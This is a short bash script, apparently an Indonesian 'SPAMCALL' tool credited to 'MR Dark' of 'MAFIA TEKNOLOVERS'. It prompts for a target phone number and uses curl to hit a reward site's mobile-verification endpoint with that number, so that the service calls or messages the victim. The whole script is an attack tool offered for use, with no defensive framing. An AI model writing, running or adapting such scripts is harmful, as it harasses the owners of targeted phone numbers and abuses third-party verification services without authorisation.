#!/bin/bash

clear
figlet "SPAMCALL"
echo ""
sleep 2
echo "============================================="
echo "(+) AUTHOR  : MR Dark                     (+)"
echo "(+) TEAM    : MAFIA TEKNOLOVERS           (+)"
echo "============================================="
echo ""
echo "(1). spam call"
echo "(2). keluar"
echo "{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}"
read -p "=> " dont

if [ $dont = "1" ]
then
    echo "masukan no target dengan 08*****"
    read -p "Masukan no target: " nomor;
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
fi

